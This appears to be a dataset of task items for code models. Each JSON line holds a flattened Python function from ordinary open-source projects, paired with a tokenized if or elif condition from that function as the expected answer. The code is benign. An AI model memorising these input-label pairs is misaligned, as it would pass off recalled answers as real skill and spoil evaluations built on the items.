{"input": "def _adjust_input(self): for i in range(len(self.block.ops)): current_op = self.block.ops[i] for input_arg in current_op.input_arg_names: if input_arg in self.input_map: current_op._rename_input(input_arg, self.input_map[input_arg])", "label": "if input_arg in self . input_map :"}
{"input": "def __getitem__(self, cls): try: return dict.__getitem__(self, cls) except KeyError as e: if not hasattr(cls, \"__bases__\"): cls = cls.__class__ for b in reversed(cls.__bases__): try: retval = self[b] # this is why a cdict instance must never be modified after # the first lookup self[cls] = retval return retval except KeyError: pass raise e", "label": "if not hasattr ( cls , \"__bases__\" ) :"}
{"input": "def before_read(self, parser, section, option, value): # If we're dealing with a quoted string as the interpolation value, # make sure we load and unquote it so we don't end up with '\"value\"' try: json_value = srsly.json_loads(value) if isinstance(json_value, str) and json_value not in JSON_EXCEPTIONS: value = json_value except Exception: pass return super().before_read(parser, section, option, value)", "label": "if isinstance ( json_value , str ) and json_value not in JSON_EXCEPTIONS :"}
{"input": "def insert_files(self, urls, pos): \"\"\"Not only images\"\"\" image_extensions = [\".png\", \".jpg\", \".bmp\", \".gif\"] for url in urls: if url.scheme() == \"file\": path = url.path() ext = os.path.splitext(path)[1] if os.path.exists(path) and ext in image_extensions: self._insert_image_from_path(path) else: self.parent.resource_edit.add_attach(path)", "label": "if os . path . exists ( path ) and ext in image_extensions :"}
{"input": "def p_constant(self, p): \"\"\"constant : PP_NUMBER\"\"\" value = p[1].rstrip(\"LlUu\") try: if value[:2] == \"0x\": value = int(value[2:], 16) elif value[0] == \"0\": value = int(value, 8) else: value = int(value) except ValueError: value = value.rstrip(\"eEfF\") try: value = float(value) except ValueError: value = 0 p[0] = ConstantExpressionNode(value)", "label": "if value [ : 2 ] == \"0x\" :"}
{"input": "def _decode_pattern_list(data): rv = [] contains_dict = False for item in data: if isinstance(item, list): item = _decode_pattern_list(item) elif isinstance(item, dict): item = _decode_pattern_dict(item) contains_dict = True rv.append(item) # avoid sorting if any element in the list is a dict if not contains_dict: rv = sorted(rv) return rv", "label": "elif isinstance ( item , dict ) :"}
{"input": "def value(self, mode): v = super(mn_armt, self).value(mode) if mode == \"l\": out = [] for x in v: if len(x) == 2: out.append(x[::-1]) elif len(x) == 4: out.append(x[:2][::-1] + x[2:4][::-1]) return out elif mode == \"b\": return [x for x in v] else: raise NotImplementedError(\"bad attrib\")", "label": "if len ( x ) == 2 :"}
{"input": "def _press_fire(self): fire_action = 1 if ( self.is_atari_env and self.env.unwrapped.get_action_meanings()[fire_action] == \"FIRE\" ): self.current_ale_lives = self.env.unwrapped.ale.lives() self.step(fire_action) if self.done: self.reset_internal_state()", "label": "if self . done :"}
{"input": "def update_fid_err_log(self, fid_err): \"\"\"add an entry to the fid_err log\"\"\" self.fid_err_log.append(fid_err) if self.write_to_file: if len(self.fid_err_log) == 1: mode = \"w\" else: mode = \"a\" f = open(self.fid_err_file, mode) f.write(\"{}\\n\".format(fid_err)) f.close()", "label": "if len ( self . fid_err_log ) == 1 :"}
{"input": "def _name(self, sender, short=True, full_email=False): words = re.sub('[\"<>]', \"\", sender).split() nomail = [w for w in words if not \"@\" in w] if nomail: if short: if len(nomail) > 1 and nomail[0].lower() in self._NAME_TITLES: return nomail[1] return nomail[0] return \" \".join(nomail) elif words: if not full_email: return words[0].split(\"@\", 1)[0] return words[0] return \"(nobody)\"", "label": "if not full_email :"}
{"input": "def zrx_order_to_json(order: Optional[ZeroExOrder]) -> Optional[Dict[str, any]]: if order is None: return None retval: Dict[str, any] = {} for key, value in order.items(): if not isinstance(value, bytes): retval[key] = value else: retval[f\"__binary__{key}\"] = base64.b64encode(value).decode(\"utf8\") return retval", "label": "if not isinstance ( value , bytes ) :"}
{"input": "def _get_outfile(self): outfile = self.inputs.transformed_file if not isdefined(outfile): if self.inputs.inverse is True: if self.inputs.fs_target is True: src = \"orig.mgz\" else: src = self.inputs.target_file else: src = self.inputs.source_file outfile = fname_presuffix(src, newpath=os.getcwd(), suffix=\"_warped\") return outfile", "label": "if self . inputs . inverse is True :"}
{"input": "def close(self): if self.changed: save = EasyDialogs.AskYesNoCancel( 'Save window \"%s\" before closing?' % self.name, 1 ) if save > 0: self.menu_save() elif save < 0: return if self.parent.active == self: self.parent.active = None self.parent.updatemenubar() del self.ted self.do_postclose()", "label": "if save > 0 :"}
{"input": "def step(self, action): \"\"\"Repeat action, sum reward, and max over last observations.\"\"\" total_reward = 0.0 done = None for i in range(self._skip): obs, reward, done, info = self.env.step(action) if i == self._skip - 2: self._obs_buffer[0] = obs if i == self._skip - 1: self._obs_buffer[1] = obs total_reward += reward if done: break # Note that the observation on the done=True frame doesn't matter. max_frame = self._obs_buffer.max(axis=0) return max_frame, total_reward, done, info", "label": "if done :"}
{"input": "def __isub__(self, other): \"\"\"In-place subtraction of a matrix or scalar.\"\"\" if isinstance(other, Matrix): if self.shape != other.shape: raise ValueError(\"matrix shapes do not match\") for row_a, row_b in izip(self._data, other): for i in xrange(len(row_a)): row_a[i] -= row_b[i] else: for row in self._data: for i in xrange(len(row)): row[i] -= other return self", "label": "if self . shape != other . shape :"}
{"input": "def check(self, count, count_v, enable, clock, reset, n): expect = 0 yield reset.posedge self.assertEqual(count, expect) self.assertEqual(count, count_v) while 1: yield clock.posedge if enable: if expect == -n: expect = n - 1 else: expect -= 1 yield delay(1) # print \"%d count %s expect %s count_v %s\" % (now(), count, expect, count_v) self.assertEqual(count, expect) self.assertEqual(count, count_v)", "label": "if expect == - n :"}
{"input": "def getmod(self, nm): mod = None for thing in self.path: if isinstance(thing, basestring): owner = self.shadowpath.get(thing, -1) if owner == -1: owner = self.shadowpath[thing] = self.__makeOwner(thing) if owner: mod = owner.getmod(nm) else: mod = thing.getmod(nm) if mod: break return mod", "label": "if mod :"}
{"input": "def get_file_language(filename, text=None): \"\"\"Get file language from filename\"\"\" ext = osp.splitext(filename)[1] if ext.startswith(\".\"): ext = ext[1:] # file extension with leading dot language = ext if not ext: if text is None: text, _enc = encoding.read(filename) for line in text.splitlines(): if not line.strip(): continue if line.startswith(\"#!\"): shebang = line[2:] if \"python\" in shebang: language = \"python\" else: break return language", "label": "if line . startswith ( \"#!\" ) :"}
{"input": "def do_status(self, directory, path): with self._repo(directory) as repo: if path: path = os.path.join(directory, path) statuses = repo.status(include=path, all=True) for status, paths in statuses: if paths: return self.statuses[status][0] return None else: resulting_status = 0 for status, paths in repo.status(all=True): if paths: resulting_status |= self.statuses[status][1] return self.repo_statuses_str[resulting_status]", "label": "if paths :"}
{"input": "def _kill(proc): if proc is None: return if proc.stdout is not None: proc.stdout.close() if proc.stderr is not None: proc.stderr.close() if proc.returncode is None: try: proc.terminate() except: if proc.returncode is None: try: proc.kill() except: pass", "label": "if proc . returncode is None :"}
{"input": "def decorated_function(*args, **kwargs): rv = f(*args, **kwargs) if isinstance(rv, flask.Response): try: result = etag if callable(result): result = result(rv) if result: rv.set_etag(result) except Exception: logging.getLogger(__name__).exception( \"Error while calculating the etag value for response {!r}\".format(rv) ) return rv", "label": "if callable ( result ) :"}
{"input": "def _list_shape_iter(shape): last_shape = _void for item in shape: if item is Ellipsis: if last_shape is _void: raise ValueError( \"invalid shape spec: Ellipsis cannot be the\" \"first element\" ) while True: yield last_shape last_shape = item yield item", "label": "if last_shape is _void :"}
{"input": "def delete_oidc_session_tokens(session): if session: if \"oidc_access_token\" in session: del session[\"oidc_access_token\"] if \"oidc_id_token\" in session: del session[\"oidc_id_token\"] if \"oidc_id_token_expiration\" in session: del session[\"oidc_id_token_expiration\"] if \"oidc_login_next\" in session: del session[\"oidc_login_next\"] if \"oidc_refresh_token\" in session: del session[\"oidc_refresh_token\"] if \"oidc_state\" in session: del session[\"oidc_state\"]", "label": "if \"oidc_access_token\" in session :"}
{"input": "def calc_parity(sig, kind): if kind in (\"zero\", \"none\"): return C(0, 1) elif kind == \"one\": return C(1, 1) else: bits, _ = value_bits_sign(sig) even_parity = sum([sig[b] for b in range(bits)]) & 1 if kind == \"odd\": return ~even_parity elif kind == \"even\": return even_parity else: assert False", "label": "elif kind == \"even\" :"}
{"input": "def parse_cookies(cookies_headers): parsed = {} for cookie in cookies_headers: cookie = cookie.split(\";\") for c in cookie: (name, value) = c.split(\"=\", 1) name = name.strip() value = value.strip() if name.lower() in _SPECIAL_COOKIE_NAMES: continue parsed[name] = value return parsed", "label": "if name . lower ( ) in _SPECIAL_COOKIE_NAMES :"}
{"input": "def search_rotate(array, val): low, high = 0, len(array) - 1 while low <= high: mid = (low + high) // 2 if val == array[mid]: return mid if array[low] <= array[mid]: if array[low] <= val <= array[mid]: high = mid - 1 else: low = mid + 1 else: if array[mid] <= val <= array[high]: low = mid + 1 else: high = mid - 1 return -1", "label": "if array [ low ] <= array [ mid ] :"}
{"input": "def _get_instance_attribute( self, attr, default=None, defaults=None, incl_metadata=False ): if self.instance is None or not hasattr(self.instance, attr): if incl_metadata and attr in self.parsed_metadata: return self.parsed_metadata[attr] elif defaults is not None: for value in defaults: if callable(value): value = value() if value is not None: return value return default return getattr(self.instance, attr)", "label": "if incl_metadata and attr in self . parsed_metadata :"}
{"input": "def _handle_rate_limit( self, exception: RedditAPIException ) -> Optional[Union[int, float]]: for item in exception.items: if item.error_type == \"RATELIMIT\": amount_search = self._ratelimit_regex.search(item.message) if not amount_search: break seconds = int(amount_search.group(1)) if \"minute\" in amount_search.group(2): seconds *= 60 if seconds <= int(self.config.ratelimit_seconds): sleep_seconds = seconds + min(seconds / 10, 1) return sleep_seconds return None", "label": "if item . error_type == \"RATELIMIT\" :"}
{"input": "def _split_values(self, value): # do the regex mojo here if not self.allowed_values: return (\"\",) try: r = re.compile(self.allowed_values) except: print(self.allowed_values, file=sys.stderr) raise s = str(value) i = 0 vals = [] while True: m = r.search(s[i:]) if m is None: break vals.append(m.group()) delimiter = s[i : i + m.start()] if self.delimiter is None and delimiter != \"\": self.delimiter = delimiter i += m.end() return tuple(vals)", "label": "if self . delimiter is None and delimiter != \"\" :"}
{"input": "def render(self, mode=\"none\"): \"\"\"Renders the environment via matplotlib.\"\"\" if mode == \"log\": self.logger.info(\"Performance: \" + str(self._portfolio.performance)) elif mode == \"chart\": if self.viewer is None: raise NotImplementedError() self.viewer.render( self.clock.step - 1, self._portfolio.performance, self._broker.trades )", "label": "if self . viewer is None :"}
{"input": "def load_vocabulary(vocab_file): with open(vocab_file, \"r\") as f: vocabulary = [] for line in f: line = line.strip() if \" \" in line: line = line.split(\" \")[0] vocabulary.append(line) return vocabulary", "label": "if \" \" in line :"}
{"input": "def test_confirm_extension_is_yml(self): files_with_incorrect_extensions = [] for file in self.yield_next_rule_file_path(self.path_to_rules): file_name_and_extension = os.path.splitext(file) if len(file_name_and_extension) == 2: extension = file_name_and_extension[1] if extension != \".yml\": files_with_incorrect_extensions.append(file) self.assertEqual( files_with_incorrect_extensions, [], Fore.RED + \"There are rule files with extensions other than .yml\", )", "label": "if extension != \".yml\" :"}
{"input": "def diff_from_indeces(self, indeces): rgroups = [] with self._lock: for i in indeces: rgroup = self.events[i] if isinstance(rgroup, findlib2.ReplaceHitGroup): rgroups.append(rgroup) return \"\\n\".join(rgroup.diff for rgroup in rgroups)", "label": "if isinstance ( rgroup , findlib2 . ReplaceHitGroup ) :"}
{"input": "def deep_update(config, override_config): for k, v in override_config.items(): if isinstance(v, Mapping): k_config = config.get(k, {}) if isinstance(k_config, Mapping): v_config = deep_update(k_config, v) config[k] = v_config else: config[k] = v else: config[k] = override_config[k] return config", "label": "if isinstance ( k_config , Mapping ) :"}
{"input": "def GetBoundingBoxMin(self): \"\"\"Get the minimum bounding box.\"\"\" x1, y1 = 10000, 10000 x2, y2 = -10000, -10000 for point in self._lineControlPoints: if point[0] < x1: x1 = point[0] if point[1] < y1: y1 = point[1] if point[0] > x2: x2 = point[0] if point[1] > y2: y2 = point[1] return x2 - x1, y2 - y1", "label": "if point [ 1 ] < y1 :"}
{"input": "def insertChars(self, chars): tc = self.editBoxes[self.ind].textCursor() if tc.hasSelection(): selection = tc.selectedText() if selection.startswith(chars) and selection.endswith(chars): if len(selection) > 2 * len(chars): selection = selection[len(chars) : -len(chars)] tc.insertText(selection) else: tc.insertText(chars + tc.selectedText() + chars) else: tc.insertText(chars)", "label": "if selection . startswith ( chars ) and selection . endswith ( chars ) :"}
{"input": "def prepare_text(text, style): body = [] for fragment, sty in parse_tags(text, style, subs.styles): fragment = fragment.replace(r\"\\h\", \" \") fragment = fragment.replace(r\"\\n\", \"\\n\") fragment = fragment.replace(r\"\\N\", \"\\n\") if sty.italic: fragment = \"<i>%s</i>\" % fragment if sty.underline: fragment = \"<u>%s</u>\" % fragment if sty.strikeout: fragment = \"<s>%s</s>\" % fragment body.append(fragment) return re.sub(\"\\n+\", \"\\n\", \"\".join(body).strip())", "label": "if sty . strikeout :"}
{"input": "def mFEBRUARY( self, ): try: _type = FEBRUARY _channel = DEFAULT_CHANNEL pass self.match(\"feb\") alt14 = 2 LA14_0 = self.input.LA(1) if LA14_0 == 114: alt14 = 1 if alt14 == 1: pass self.match(\"ruary\") self._state.type = _type self._state.channel = _channel finally: pass", "label": "if LA14_0 == 114 :"}
{"input": "def test_calendar(self): subreddit = self.reddit.subreddit(pytest.placeholders.test_subreddit) widgets = subreddit.widgets with self.use_cassette(\"TestSubredditWidgets.fetch_widgets\"): calendar = None for widget in widgets.sidebar: if isinstance(widget, Calendar): calendar = widget break assert isinstance(calendar, Calendar) assert calendar == calendar assert calendar.id == calendar assert calendar in widgets.sidebar assert isinstance(calendar.configuration, dict) assert hasattr(calendar, \"requiresSync\") assert subreddit == calendar.subreddit", "label": "if isinstance ( widget , Calendar ) :"}
{"input": "def count(num): cnt = 0 for i in range(num): try: if i % 2: raise ValueError if i % 3: raise ArithmeticError(\"1\") except Exception as e: cnt += 1 return cnt", "label": "if i % 3 :"}
{"input": "def pop(self): \"\"\"Pop a nonterminal. (Internal)\"\"\" popdfa, popstate, popnode = self.stack.pop() newnode = self.convert(self.grammar, popnode) if newnode is not None: if self.stack: dfa, state, node = self.stack[-1] node[-1].append(newnode) else: self.rootnode = newnode try: self.rootnode.used_names = self.used_names except AttributeError: # Don't need this hack? pass", "label": "if self . stack :"}
{"input": "def handle_custom_actions(self): for _, action in CustomAction.registry.items(): if action.resource != self.resource: continue if action.action not in self.parser.choices: self.parser.add_parser(action.action, help=\"\") action(self.page).add_arguments(self.parser, self)", "label": "if action . action not in self . parser . choices :"}
{"input": "def get_host_metadata(self): meta = {} if self.agent_url: try: resp = requests.get(self.agent_url, timeout=1).json().get(\"config\", {}) if \"Version\" in resp: meta[\"nomad_version\"] = resp.get(\"Version\") if \"Region\" in resp: meta[\"nomad_region\"] = resp.get(\"Region\") if \"Datacenter\" in resp: meta[\"nomad_datacenter\"] = resp.get(\"Datacenter\") except Exception as ex: self.log.debug(\"Error getting Nomad version: %s\" % str(ex)) return meta", "label": "if \"Datacenter\" in resp :"}
{"input": "def _source_tuple(af, address, port): # Make a high level source tuple, or return None if address and port # are both None if address or port: if address is None: if af == socket.AF_INET: address = \"0.0.0.0\" elif af == socket.AF_INET6: address = \"::\" else: raise NotImplementedError(f\"unknown address family {af}\") return (address, port) else: return None", "label": "if af == socket . AF_INET :"}
{"input": "def _evoke_request(cls): succeed = False with cls.LOCK: if len(cls.REQUESTING_STACK) > 0: resource, request_semaphore = cls.REQUESTING_STACK.pop() node = cls.check_availability(resource) if node is not None: cls.NODE_RESOURCE_MANAGER[node]._request(node, resource) logger.debug(\"\\nEvoking requesting resource {}\".format(resource)) request_semaphore.release() succeed = True else: cls.REQUESTING_STACK.append((resource, request_semaphore)) return if succeed: cls._evoke_request()", "label": "if node is not None :"}
{"input": "def update_all_rhos(instances, scenario_tree, rho_value=None, rho_scale=None): assert not ((rho_value is not None) and (rho_scale is not None)) for stage in scenario_tree._stages[:-1]: for tree_node in stage._tree_nodes: for scenario in tree_node._scenarios: rho = scenario._rho[tree_node._name] for variable_id in tree_node._variable_ids: if rho_value is not None: rho[variable_id] = rho_value else: rho[variable_id] *= rho_scale", "label": "if rho_value is not None :"}
{"input": "def configured_request_log_handlers(config, prefix=\"query_log\", default_logger=None): \"\"\"Returns configured query loggers as defined in the `config`.\"\"\" handlers = [] for section in config.sections(): if section.startswith(prefix): options = dict(config.items(section)) type_ = options.pop(\"type\") if type_ == \"default\": logger = default_logger or get_logger() handler = ext.request_log_handler(\"default\", logger) else: handler = ext.request_log_handler(type_, **options) handlers.append(handler) return handlers", "label": "if section . startswith ( prefix ) :"}
{"input": "def eval_dummy_genomes_ctrnn_bad(genomes, config): for genome_id, genome in genomes: net = neat.ctrnn.CTRNN.create(genome, config, 0.01) net.advance([0.5, 0.5, 0.5], 0.01, 0.05) if genome_id <= 150: genome.fitness = 0.0 else: net.reset() genome.fitness = 1.0", "label": "if genome_id <= 150 :"}
{"input": "def housenumber(self): if self.street: expression = r\"\\d+\" pattern = re.compile(expression) match = pattern.search(self.street, re.UNICODE) if match: return match.group(0)", "label": "if match :"}
{"input": "def func(): end_received = False while True: for idx, q in enumerate(self._local_out_queues): data = q.get() q.task_done() if isinstance(data, EndSignal): end_received = True if idx > 0: continue self._out_queue.put(data) if end_received: break", "label": "if idx > 0 :"}
{"input": "def spin(): \"\"\"Wheeeee!\"\"\" state = 0 states = random.choice(spinners.spinners) while True: prefix = \"[%s] \" % _spinner_style(states[state]) spinner_handle.update(prefix) state = (state + 1) % len(states) if stop.wait(0.1): break", "label": "if stop . wait ( 0.1 ) :"}
{"input": "def _format_ip_address(container_group): \"\"\"Format IP address.\"\"\" ip_address = container_group.get(\"ipAddress\") if ip_address: ports = ip_address[\"ports\"] or [] if ip_address[\"type\"] == \"Private\": for container in container_group.get(\"containers\"): ports += container.get(\"ports\") ports = \",\".join(str(p[\"port\"]) for p in ports) return \"{0}:{1}\".format(ip_address.get(\"ip\"), ports) return None", "label": "if ip_address [ \"type\" ] == \"Private\" :"}
{"input": "def check(self, count, count_v, enable, clock, reset, n): expect = 0 yield reset.posedge self.assertEqual(count, expect) self.assertEqual(count, count_v) while 1: yield clock.posedge if enable: if expect == -n: expect = n - 1 else: expect -= 1 yield delay(1) # print \"%d count %s expect %s count_v %s\" % (now(), count, expect, count_v) self.assertEqual(count, expect) self.assertEqual(count, count_v)", "label": "if enable :"}
{"input": "def _to_str(self, tokens: List[int]) -> str: pos = next( (idx for idx, x in enumerate(tokens) if x == self.vocab.eos_token_id), -1 ) if pos != -1: tokens = tokens[:pos] vocab_map = self.vocab.id_to_token_map_py words = [vocab_map[t] for t in tokens] if self.encoding is not None and self.perform_decode: if self.encoding == \"bpe\": words = self.bpe_decode(words) elif self.encoding == \"spm\": words = self.spm_decode(words) sentence = \" \".join(words) return sentence", "label": "elif self . encoding == \"spm\" :"}
{"input": "def _iterate_files(self, files, root, include_checksums, relpath): file_list = {} for file in files: exclude = False # exclude defined filename patterns for pattern in S3Sync.exclude_files: if fnmatch.fnmatch(file, pattern): exclude = True break if not exclude: full_path = root + \"/\" + file if include_checksums: # get checksum checksum = self._hash_file(full_path) else: checksum = \"\" file_list[relpath + file] = [full_path, checksum] return file_list", "label": "if include_checksums :"}
{"input": "def render(self, context): if self.user is None: entries = LogEntry.objects.all() else: user_id = self.user if not user_id.isdigit(): user_id = context[self.user].pk entries = LogEntry.objects.filter(user__pk=user_id) context[self.varname] = entries.select_related(\"content_type\", \"user\")[ : int(self.limit) ] return \"\"", "label": "if not user_id . isdigit ( ) :"}
{"input": "def pin_data_keys(self, session_id, data_keys, token, devices=None): if not devices: devices = functools.reduce( operator.or_, self._manager_ref.get_data_locations(session_id, data_keys), set(), ) else: devices = self._normalize_devices(devices) pinned = set() for dev in devices: handler = self.get_storage_handler(dev) if not getattr(handler, \"_spillable\", False): continue keys = handler.pin_data_keys(session_id, data_keys, token) pinned.update(keys) return list(pinned)", "label": "if not getattr ( handler , \"_spillable\" , False ) :"}
{"input": "def resolve(self, value: Optional[T]) -> T: v: Optional[Any] = value if value is None: t = os.environ.get(self.envvar) if self.type is bool and t: v = t in [\"true\", \"True\", \"1\", \"yes\"] elif self.type is str and t: v = t elif t: v = ast.literal_eval(t) if t is not None else None if v is None: v = self.default return v", "label": "elif t :"}
{"input": "def remove(self, *objs): val = getattr(instance, rel_field.rel.get_related_field().attname) for obj in objs: # Is obj actually part of this descriptor set? if getattr(obj, rel_field.attname) == val: setattr(obj, rel_field.name, None) obj.save() else: raise rel_field.rel.to.DoesNotExist( \"%r is not related to %r.\" % (obj, instance) )", "label": "if getattr ( obj , rel_field . attname ) == val :"}
{"input": "def generate_segment_memory(chart_type, race_configs, environment): structures = [] for race_config in race_configs: if \"segment_memory\" in race_config.charts: title = chart_type.format_title( environment, race_config.track, es_license=race_config.es_license, suffix=\"%s-segment-memory\" % race_config.label, ) chart = chart_type.segment_memory(title, environment, race_config) if chart: structures.append(chart) return structures", "label": "if chart :"}
{"input": "def comment_multiline(self, text, delimiter_end, delimiter_start, style): \"\"\"Process the beggining and end of a multiline comment.\"\"\" startIndex = 0 if self.previousBlockState() != 1: startIndex = delimiter_start.indexIn(text) while startIndex >= 0: endIndex = delimiter_end.indexIn(text, startIndex) commentLength = 0 if endIndex == -1: self.setCurrentBlockState(1) commentLength = len(text) - startIndex else: commentLength = endIndex - startIndex + delimiter_end.matchedLength() self.setFormat(startIndex, commentLength, style) startIndex = delimiter_start.indexIn(text, startIndex + commentLength)", "label": "if endIndex == - 1 :"}
{"input": "def getLatestFile(self): highestNsp = None highestNsx = None for nsp in self.getFiles(): try: if nsp.path.endswith(\".nsx\"): if not highestNsx or int(nsp.version) > int(highestNsx.version): highestNsx = nsp else: if not highestNsp or int(nsp.version) > int(highestNsp.version): highestNsp = nsp except BaseException: pass return highestNsp or highestNsx", "label": "if not highestNsp or int ( nsp . version ) > int ( highestNsp . version ) :"}
{"input": "def handle(self, msg): self._mic.send(msg) for calculate_seed, make_delegate, dict in self._delegate_records: id = calculate_seed(msg) if id is None: continue elif isinstance(id, collections.Hashable): if id not in dict or not dict[id].is_alive(): d = make_delegate((self, msg, id)) d = self._ensure_startable(d) dict[id] = d dict[id].start() else: d = make_delegate((self, msg, id)) d = self._ensure_startable(d) d.start()", "label": "if id is None :"}
{"input": "def _build_pcf(named_sc, named_pc): r = \"\" for sig, pins, others, resname in named_sc: if len(pins) > 1: for bit, pin in enumerate(pins): r += \"set_io {}[{}] {}\\n\".format(sig, bit, pin) else: r += \"set_io {} {}\\n\".format(sig, pins[0]) if named_pc: r += \"\\n\" + \"\\n\\n\".join(named_pc) return r", "label": "if len ( pins ) > 1 :"}
{"input": "def __init__(self, profile, report_dir=None, timestamp=None): # self.metadata = {} self.report_dir = report_dir if report_dir else DEFAULT_REPORT_DIR self.profile = profile.replace(\"/\", \"_\").replace(\"\\\\\", \"_\") # Issue 111 self.current_time = datetime.datetime.now(dateutil.tz.tzlocal()) if timestamp != False: self.timestamp = ( self.current_time.strftime(\"%Y-%m-%d_%Hh%M%z\") if not timestamp else timestamp )", "label": "if not timestamp"}
{"input": "def _convert_params_to_v3(params): for k, v in OLD_TO_NEW_PARAMS.items(): if k in params: msg = Message.WARN_PARAMS_NOT_SUPPORTED % (k, v) warnings.warn(msg, DeprecationWarning) # update to the new query param if not specified already if v not in params: params[v] = params.pop(k)", "label": "if v not in params :"}
{"input": "def rollup_logical(counter, lookup, logical_keys): logical = Counter() for k, v in counter.items(): # TODO: eek, do a fallback of some kind if k not in lookup: logical[(\"unknown\", k)] = v continue linfo = lookup[k] lkey = tuple(linfo.get(lk, \"unknown\") for lk in logical_keys) logical[lkey] += v return logical", "label": "if k not in lookup :"}
{"input": "def assert_summary_equals(self, records, tag, step, value): for record in records[1:]: if record.summary.value[0].tag != tag: continue if record.step != step: continue self.assertEqual(value, tf.make_ndarray(record.summary.value[0].tensor)) return self.fail(\"Could not find record for tag {} and step {}\".format(tag, step))", "label": "if record . step != step :"}
{"input": "def get_name_from_types(types: Iterable[Union[Type, StrawberryUnion]]): names = [] for type_ in types: if isinstance(type_, StrawberryUnion): return type_.name elif hasattr(type_, \"_type_definition\"): name = capitalize_first(type_._type_definition.name) else: name = capitalize_first(type_.__name__) names.append(name) return \"\".join(names)", "label": "elif hasattr ( type_ , \"_type_definition\" ) :"}
{"input": "def parseBamPEFDistributionFile(self, f): d = dict() lastsample = [] for line in f[\"f\"].splitlines(): cols = line.rstrip().split(\"\\t\") if cols[0] == \"#bamPEFragmentSize\": continue elif cols[0] == \"Size\": continue else: s_name = self.clean_s_name(cols[2].rstrip().split(\"/\")[-1], f[\"root\"]) if s_name != lastsample: d[s_name] = dict() lastsample = s_name d[s_name].update({self._int(cols[0]): self._int(cols[1])}) return d", "label": "if cols [ 0 ] == \"#bamPEFragmentSize\" :"}
{"input": "def read_output(meteor_output_path, n_repeats): n_combinations = math.factorial(n_repeats) / ( math.factorial(2) * math.factorial(n_repeats - 2) ) raw_scores = [] average_scores = [] for line in open(meteor_output_path): if not line.startswith(\"Segment \"): continue score = float(line.strip().split(\"\\t\")[1]) raw_scores.append(score) if len(raw_scores) == n_combinations: average_scores.append(sum(raw_scores) / n_combinations) raw_scores = [] os.remove(meteor_output_path) return average_scores", "label": "if len ( raw_scores ) == n_combinations :"}
{"input": "def get_new_pids(self): if not self.need_poll(): return for process in psutil.process_iter(): info = process.as_dict([\"create_time\", \"pid\", \"name\", \"exe\"]) pid = info[\"pid\"] if pid not in self.pids or self.pids[pid] == info[\"create_time\"]: for name in self.names: if name.match(info[\"name\"]) or name.match(info[\"exe\"]): yield pid self.pids[pid] = info[\"create_time\"]", "label": "if name . match ( info [ \"name\" ] ) or name . match ( info [ \"exe\" ] ) :"}
{"input": "def _Attribute(self, node): if not isinstance(node.ctx, ast.Store): scope = self.scope.get_inner_scope_for_line(node.lineno) pyname = evaluate.eval_node(scope, node.value) if pyname is not None and pyname.get_object() != pyobjects.get_unknown(): if node.attr not in pyname.get_object(): self._add_error(node, \"Unresolved attribute\") ast.walk(node.value, self)", "label": "if pyname is not None and pyname . get_object ( ) != pyobjects . get_unknown ( ) :"}
{"input": "def _init_neighbor(neighbor): families = neighbor.families() for change in neighbor.changes: if change.nlri.family() in families: # This add the family to neighbor.families() neighbor.rib.outgoing.add_to_rib_watchdog(change) for message in messages: if message.family() in families: if message.name == \"ASM\": neighbor.asm[message.family()] = message else: neighbor.messages.append(message) self.neighbors[neighbor.name()] = neighbor", "label": "if message . name == \"ASM\" :"}
{"input": "def date_match(self, date1, date2): if date1.is_empty() or date2.is_empty(): return 0 if date1.is_equal(date2): return 1 if date1.is_compound() or date2.is_compound(): return self.range_compare(date1, date2) if date1.get_year() == date2.get_year(): if date1.get_month() == date2.get_month(): return 0.75 if not date1.get_month_valid() or not date2.get_month_valid(): return 0.75 else: return -1 else: return -1", "label": "if date1 . get_month ( ) == date2 . get_month ( ) :"}
{"input": "def del_var_history(self, var, f=None, line=None): \"\"\"If file f and line are not given, the entire history of var is deleted\"\"\" if var in self.variables: if f and line: self.variables[var] = [ x for x in self.variables[var] if x[\"file\"] != f and x[\"line\"] != line ] else: self.variables[var] = []", "label": "if f and line :"}
{"input": "def test_certs(self): self.assertTrue(len(self.regions) > 0) for region in self.regions: special_access_required = False for snippet in (\"gov\", \"cn-\"): if snippet in region.name: special_access_required = True break try: c = region.connect() self.sample_service_call(c) except: # This is bad (because the SSL cert failed). Re-raise the # exception. if not special_access_required: raise", "label": "if not special_access_required :"}
{"input": "def convert_encoder_layer(opus_dict, layer_prefix: str, converter: dict): sd = {} for k in opus_dict: if not k.startswith(layer_prefix): continue stripped = remove_prefix(k, layer_prefix) v = opus_dict[k].T # besides embeddings, everything must be transposed. sd[converter[stripped]] = torch.tensor(v).squeeze() return sd", "label": "if not k . startswith ( layer_prefix ) :"}
{"input": "def test_sequence(self, sequence): for test in sequence: if isinstance(test, tuple): test, kwargs = test else: kwargs = {} self.do_check(test, **kwargs) if test == ExpectedError: return False return True", "label": "if isinstance ( test , tuple ) :"}
{"input": "def make_table(grid): max_cols = [ max(out) for out in map(list, zip(*[[len(item) for item in row] for row in grid])) ] rst = table_div(max_cols, 1) for i, row in enumerate(grid): header_flag = False if i == 0 or i == len(grid) - 1: header_flag = True rst += normalize_row(row, max_cols) rst += table_div(max_cols, header_flag) return rst", "label": "if i == 0 or i == len ( grid ) - 1 :"}
{"input": "def test_float_overflow(self): import sys big_int = int(sys.float_info.max) * 2 for t in float_types + [c_longdouble]: self.assertRaises(OverflowError, t, big_int) if hasattr(t, \"__ctype_be__\"): self.assertRaises(OverflowError, t.__ctype_be__, big_int) if hasattr(t, \"__ctype_le__\"): self.assertRaises(OverflowError, t.__ctype_le__, big_int)", "label": "if hasattr ( t , \"__ctype_le__\" ) :"}
{"input": "def _process_folder(config, folder, cache, output): if not os.path.isdir(folder): raise ConanException(\"No such directory: '%s'\" % str(folder)) if config.source_folder: folder = os.path.join(folder, config.source_folder) for root, dirs, files in walk(folder): dirs[:] = [d for d in dirs if d != \".git\"] if \".git\" in root: continue for f in files: _process_file(root, f, config, cache, output, folder)", "label": "if \".git\" in root :"}
{"input": "def setChanged(self, c, changed): # Find the tab corresponding to c. dw = c.frame.top # A DynamicWindow i = self.indexOf(dw) if i < 0: return s = self.tabText(i) s = g.u(s) if len(s) > 2: if changed: if not s.startswith(\"* \"): title = \"* \" + s self.setTabText(i, title) else: if s.startswith(\"* \"): title = s[2:] self.setTabText(i, title)", "label": "if changed :"}
{"input": "def dump_metrics(self): metrics = self._registry.dump_metrics() # Filter out min and max if there have been no samples. for metric in metrics.itervalues(): if metric.get(\"count\") == 0: if \"min\" in metric: metric[\"min\"] = 0.0 if \"max\" in metric: metric[\"max\"] = 0.0 return metrics", "label": "if \"min\" in metric :"}
